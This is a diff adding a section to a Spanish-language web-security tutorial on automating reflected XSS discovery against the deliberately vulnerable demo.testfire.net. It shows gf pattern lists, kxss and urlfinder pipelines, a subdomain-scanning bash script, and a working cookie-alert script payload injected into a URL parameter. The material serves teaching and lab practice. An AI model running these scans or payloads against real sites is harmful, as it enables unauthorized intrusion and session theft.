@@ -249,6 +249,154 @@ https://demo.testfire.net/search.jsp?query=<script>alert(document.cookie)</scrip
 ```
 
 <!-- espacio -->
+## 7. Automatizar Busqueda Reflected XSS
+> Nos apoyamos de la tools gf para encontrar parametros comunes con posibles xss reflect
+```bash
+go install github.com/tomnomnom/gf@latest
+#clonar patrones
+mkdir -p ~/.gf
+git clone https://github.com/1ndianl33t/Gf-Patterns
+cp Gf-Patterns/*.json ~/.gf
+```
+<details>
+<summary>📜 xss.json</summary>
+
+```bash
+$  cat ~/.gf/xss.json
+{
+     "flags": "-iE", 
+     "patterns": [
+"q=",
+"s=",
+"search=",
+"lang=",
+"keyword=",
+"query=",
+"page=",
+"keywords=",
+"year=",
+"view=",
+"email=",
+"type=",
+"name=",
+"p=",
+"callback=",
+"jsonp=",
+"api_key=",
+"api=",
+"password=",
+"email=",
+"emailto=",
+"token=",
+"username=",
+"csrf_token=",
+"unsubscribe_token=",
+"id=",
+"item=",
+"page_id=",
+"month=",
+"immagine=",
+"list_type=",
+"url=",
+"terms=",
+"categoryid=",
+"key=",
+"l=",
+"begindate=",
+"enddate="
+
+]
+}
+```
+</details>
+
+> Filtrar el fichero que contiene las url katana que contengan patrones xss
+
+```bash
+cat testfire.net_katana_results.txt | gf xss
+
+https://demo.testfire.net/survey_questions.jsp?step=a
+https://demo.testfire.net/util/serverStatusCheckService.jsp?HostName=
+https://demo.testfire.net/disclaimer.htm?url=http://www.microsoft.com
+https://demo.testfire.net/disclaimer.htm?url=http://www.netscape.com 
+```
+> Filtrar el fichero que contiene las url katana que contengan patrones xss
+```bash
+#payload:
+<script>alert(document.cookie)</script>
+https://demo.testfire.net/util/serverStatusCheckService.jsp?HostName=
+https://demo.testfire.net/util/serverStatusCheckService.jsp?HostName=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+```
+![image](https://github.com/user-attachments/assets/0c5a3d6a-883c-4322-825a-73bc2747f7f3)
+
+<!-- espacio -->
+> Kxss
+>> Kxss parametros previos filtrados
+
+```bash
+cat demo.testfire.net_katana_results.txt 
+https://demo.testfire.net
+...
+https://demo.testfire.net/survey_questions.jsp?step=a
+```
+```bash
+cat demo.testfire.net_katana_results.txt | grep = | kxss > kxss_test.txt  
+```
+```bash
+cat kxss_test.txt  
+URL: https://demo.testfire.net/index.jsp?content=business_retirement.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; 
+...
+URL: https://demo.testfire.net/index.jsp?content=inside_press.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
+URL: https://demo.testfire.net/index.jsp?content=business_cards.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
+URL: https://demo.testfire.net/index.jsp?content=inside_careers.htm Param: content Unfiltered: [" ' < > $ | ( ) ` : ; { }] 
+```
+
+<!-- espacio -->
+>> Kxss usando urlfinder (10/10)
+```bash
+urlfinder -d demo.testfire.net | grep = | kxss > kxss_demo.txt
+```
+```bash
+urlfinder -d demo.testfire.net | grep = | kxss > kxss_demo.txt
+```
+```bash
+nano kxss_scan.sh
+chmod +x kxss_scan.sh
+./kxss_scan.sh
+```
+<details>
+<summary>📜 Ver script Bash completo</summary>
+
+```bash
+#!/bin/bash
+
+# Archivo con subdominios
+SUBDOMAINS_FILE="testfire.net_all_subs.txt"
+# Carpeta de salida
+OUTPUT_DIR="kxss_results"
+# Crear carpeta si no existe
+mkdir -p "$OUTPUT_DIR"
+
+# Iterar sobre cada subdominio
+while read -r sub; do
+    echo "[*] Escaneando: $sub"
+    
+    # Normalizar nombre para el fichero de salida
+    OUT_FILE="${OUTPUT_DIR}/${sub//./_}.txt"
+    
+    # Ejecutar pipeline
+    urlfinder -d "$sub" | grep = | kxss > "$OUT_FILE"
+    
+    echo "[+] Resultados guardados en: $OUT_FILE"
+done < "$SUBDOMAINS_FILE"
+
+echo "[✔] Escaneo finalizado. Revisa la carpeta: $OUTPUT_DIR"
+```
+</details>
+![image](https://github.com/user-attachments/assets/4243779d-aee0-412f-bb42-2dec702a4c26)
+
+<!-- espacio -->
+<!-- espacio -->
 ## Creditos y Recursos
 >*Referencias: [PortSwigger](https://portswigger.net/web-security/cross-site-scripting)*
 >>*Referencias: [TryHackme](https://tryhackme.com/room/axss)*
